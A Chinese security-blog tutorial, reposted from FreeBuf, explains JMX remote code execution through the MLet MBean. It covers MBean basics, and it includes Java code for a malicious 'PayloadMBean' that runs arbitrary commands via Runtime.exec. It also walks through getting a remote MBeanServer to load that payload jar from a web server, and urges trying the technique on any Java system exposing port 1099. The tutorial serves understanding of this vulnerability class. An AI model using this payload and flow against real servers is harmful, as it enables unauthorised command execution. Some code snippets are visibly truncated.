> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/sVCSuoYIoJ63W5kWHrxMiw)

**前言：**
-------

**前一段时间 apace solr JMX 因为配置不当出现远程代码执行漏洞，最近自己在看一套 java 系统时，发现该系统也存在 JMX 远程代码漏洞，于是乎就想研究下 JMX 这种通用型漏洞，下面我就从原理到利用对该漏洞做一个简单的梳理。**

**一、****JMX** **服务和 MBean**
---------------------------

JMX（Java Management Extensions，即 Java 管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX 是一套复杂的机制，由于我们要讲的 JMX 远程代码漏洞和 MBean 相关，所以这里我们之介绍 jmx 和 mbean 相关的一些基础知识。

JMX 是管理扩展，通过 JMX 我们可以监控管理我们的指定的 java 程序。但不是所有的 java 类都能被管理。只有按照特定格式编写的 java 类才能被 jmx 原理。这种特定格式机制我们称为 Mbean。

我们先看一个简单的 MBean，mbean 首先需要定义一个接口，定义格式 xxxMBean,

之后再定义一个实现该接口的类。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsMy2GaZMOPBw4BXVCwVulAH31VXz6p2BX0IibUtqpgWecbhhKSvLckXlA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsMscebS81AErEGHjQF8ZwicIG9ozic0LsVkVz6gZ1QhUIuQaUibVTcPcV4g/640?wx_fmt=jpeg)

**二、****MBeanServer**
---------------------

对于已经实现的 MBean，我们怎么进行监控和管理，这里就需要 MBeanServer 了。我们可以将 MBeanServer 理解为一个 mbean 的仓库，需要监控的 mbean 都需要先注册到仓库中。向 MBeanServer 注册 mbean 有两种方式，一是本地注册，二是远程注册（远程注册就为我们执行任意代码提供了可能，后面会细讲）。

我们先看一段简单的代码，本地向 mbeanserver 注册 mbean。

```
public static void main(String[] args) throwsException{
MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
//向MBeanServer 注册 mbean
ObjectName helloName = new ObjectName("HelloMbean:);
mBeanServer.registerMBean(new Hello(), helloName);
Registry registry = LocateRegistry.createRegistry(1099);
//构造 JMXServiceURL
JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi");
JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
jmxConnectorServer.start();
System.out.println("JMXConnectorServer is running");}

```

运行程序，使用 jconsole 链接 127.0.0.1:1099，可以看到我们的 HelloMBean, 也可以执行 Hello() 函数。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsMnQq7JHcJmRDSaSONVic8icicSoS91QcKiasRAVBVxj2kWqibW5K2qvZ3jtw/640?wx_fmt=jpeg)整个过程代码实现如下：

```
static void JMXClient() throws Exception{     JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi");     JMXConnector jmxConnector = JMXConnectorFactory.connect(url,null);     MBeanServerConnection mBeanServerConnection = jmxConnector.getMBeanServerConnection();     ObjectName mbeanName = new ObjectName("HelloMbean:, null, null); }

```

我们可以在代码中执行 MBean 中的方法。

**三、****一个特殊的 Mbean** **之 MLet**
--------------------------------

前面我们知道了 mbean 是什么东西，这里我们需要认识一个特殊的 mbean 叫 MLet。

这是一个系统自带的 mbean。我们简单看下其定义。

```
/**  * Exposes the remote management interface of the MLet  * MBean.  */ public interface MLetMBean   {

```

```
public class MLet extends java.net.URLClassLoader
implements MLetMBean, MBeanRegistration, Externalizable { private static final long serialVersionUID = 3636148327800330130L;/** * The reference to the MBean server.*/ private MBeanServer server = null;

```

**![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsMxEuM8LQU6jFxMlZ1IWI3oKib5o52PbI9gtqsyjMmxh3wtraRjXc0kIw/640?wx_fmt=jpeg)**

简单理解就是，我们可以通过 Mlet 加载一个远程服务器上的 MBean，并且没有对远程的 mbean 做合法性检测。

Mlet 定义了一个函数 getMBeanFromURL，用来加载并实例化远程的 Mbean。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsMXg0QC2pux9In3DgFGaCzReKibZCoTG7Lrkic5ziaicT7YQFSI7LumJGXxg/640?wx_fmt=jpeg)

至于 getMBeanFromURL 怎么加载远程 mbean，加载哪个 mbean。需要 mlet 来规定。

上面规定了 mlet 的格式，下面我们简单看下几个必须字段的含义。

CODE = class

此属性指定了要获取的 MBean 的 Java 类的全名，包括包名称。

ARCHIVE = "archiveList"

此属性是必需的，它指定了一个或多个 .jar 文件，这些文件包含要获取的 MBean 使用的 MBean 或其他资源。

NAME = mbeanname

当 m-let 已注册 MBean 实例时，此可选属性指定了要分配给 MBean 实例的对象名称。如果 mbeanname 以冒号字符 (:) 开始，则对象名称的域部分是 MBean 服务器的默认域，可由 MBeanServer.getDefaultDomain() 返回。

**四、****使用 Melt** **加载远程 MBean**
--------------------------------

上一节我们简单介绍了下 MLet，这节介绍下怎么加载远程的 MBean

下面我们先实现一个恶意的 MBean，并将其打包成 JMXPayload.jar。

```
public interface PayloadMBean {     public String runCmd(String cmd) throws IOException, InterruptedException; } public class Payload implements PayloadMBean {     @Override     public String runCmd(String cmd) throws IOException,InterruptedException {         Runtime runtime = Runtime.getRuntime();         Process process = runtime.exec(cmd);         BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));         BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));         String stdout_data = "";         String strtmp;         while ((strtmp = stdInput.readLine()) != null) {             stdout_data += strtmp + "\n";         }         while ((strtmp = stdError.readLine()) != null) {             stdout_data += strtmp + "\n";         }         process.waitFor();         return stdout_data;     } }

```

构造 mlet 文件

将 mlet 和 JMXPayload.jar 放在 web 下同一个目录中。

**![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsMnyicFzicJk1vUmLtU8Nic6ztXyCGUO6R064iacAYYbwxaKiaQibaT7QKrGDQ/640?wx_fmt=jpeg)**

先使用 registerMBean 向 MBeanServer 注册 Mlet，然后使用 getMBeanFromURL 函数加载远程的 PayloadMBean。

运行程序，使用 jsonsole 连接 127.0.0.1:1099

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsMUZaldWicStynpqGhcVf0bGW57OAu9HUscw7K6wGWdou4VibZl6tPnxeA/640?wx_fmt=jpeg)**五、****向远程的 MBeanServer** **注册 mbean**
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

前几节介绍的向 MBeanServer 注册 mbean 都是在 server 端完成的，那如何在 client 端向远程的 MBeanServer 注册 mbean 呢。

我们先实现一个默认的 MBeanServer，没有向其注册我们的 mbean。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsMFRNviaiaz95kB5icLqGeUejMWQoIoBLibDTrib2OWktpbF7WoDq05kFPyLA/640?wx_fmt=jpeg)

本地我们可以通过 MBeanServer.RegisterMBean 注册 mbean

远端我们可以通过 MBeanServerConnection.createMBean 注册 mbean

客户端代码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsM3HFS0rhxmsjwYl9AIzsgMXr3krg2NZAeKiaIlxAN8s8nUr5CIiaqHqoA/640?wx_fmt=jpeg)

Jconsole 查看结果如下，Mlet 已经被注册：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsMFZdSsfyb8nbGlibx1xrezia90BDyWibRcMLEVKWNRZMEeiarDpl5mlmPmg/640?wx_fmt=jpeg)然后通过 getMBeansFromURL 加载我们的恶意 Mbean, 执行结果如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsMCg9ooIy2KAL4F494jD5Ncezfm1qGiaCXILdkqkR2v3hPCqNUfw3fhyg/640?wx_fmt=jpeg)

然后可以通过 payload 执行任意代码

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib22iaoxb2Dlicp4RgaxgqQsMphCicKVzmW7eTY99yUZ60HD3Ddp1GUn8hkMiayNGRLqaGT2HguaCXt5g/640?wx_fmt=jpeg)当然这个 jsonsole 执行代码这个流程可以使用代码实现，有兴趣的可以自己研究下。

**六、总结**
--------

至此，JMX 漏洞的整理利用流程就结束了。我们再重新梳理下过程。

> 首先是 MBeanServer 提供了一套远程注册 MBean 的机制，让我们能够在本地向远端注册 MBean。这个问题不大，因为我们不能注册自己写的 mbean，只能注册远端服务器上已经有的 mbean。巧的是 jdk 自己就有一些 mbean，其中有一个 mbean 叫 mlet。
> 
> Mlet 是实现了一个函数 getMBeansFromURL(url), 这个函数能够加载并实例化我们指定的远程 mbean，从而导致了我们的恶意 payloadMBean 被加载注册到 MBeanServer 上，导致任意命令执行。
> 
> JMX 漏洞是一个通用型漏洞，如果遇到 java 系统开启 1099 端口，或者开启 jmx 的都可以使用该漏洞测试一下，惊喜就在意外中。

参考：
---

> https://www.apiref.com/java11-zh/java.management/javax/management/loading/MLet.html
> 
> https://www.anquanke.com/post/id/194126

* **本文原创作者：MrCoding，本文属于 FreeBuf 原创奖励计划，未经许可禁止转载**

![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38Tm7G07JF6t0KtSAuSbyWtgFA8ywcatrPPlURJ9sDvFMNwRT0vpKpQ14qrYwN2eibp43uDENdXxgg/640?wx_fmt=gif)

![](http://mmbiz.qpic.cn/mmbiz_png/3Uce810Z1ibJ71wq8iaokyw684qmZXrhOEkB72dq4AGTwHmHQHAcuZ7DLBvSlxGyEC1U21UMgSKOxDGicUBM7icWHQ/640?wx_fmt=png&wxfrom=200) 交易担保 FreeBuf+ FreeBuf + 小程序：把安全装进口袋 小程序

  

精彩推荐

  

  

  

  

****![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib2xibAss1xbykgjtgKvut2LUribibnyiaBpicTkS10Asn4m4HgpknoH9icgqE0b0TVSGfGzs0q8sJfWiaFg/640?wx_fmt=jpeg)****

  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38N1ibc28m106XBOZqPfmdichVeQfcl3VFtT457O3xkY9iaf0jCS8fY3KHznPacyRibeGWf6cZEbQ0gRA/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247484111&idx=1&sn=f6537a7cc7d41948fd7fa6c95829dd7e&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38N1ibc28m106XBOZqPfmdichQF3e77AELshS8UwXdWTrNib9OUcRutH0Z4F1GX7geZ3aYLCWg0mqESA/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247484105&idx=1&sn=6aeef8d1cafdfcaadc54c26a395c4aa5&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR38N1ibc28m106XBOZqPfmdichMyKw7mViaF89OftycfbYDS6hbVB4CLvlxOricLDFzMibfQ7JuicS2ia7qog/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247484099&idx=1&sn=27c9b1f45cf3cfcb6ff86a6ce2da14e9&scene=21#wechat_redirect)

**************![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/640?wx_fmt=gif)**************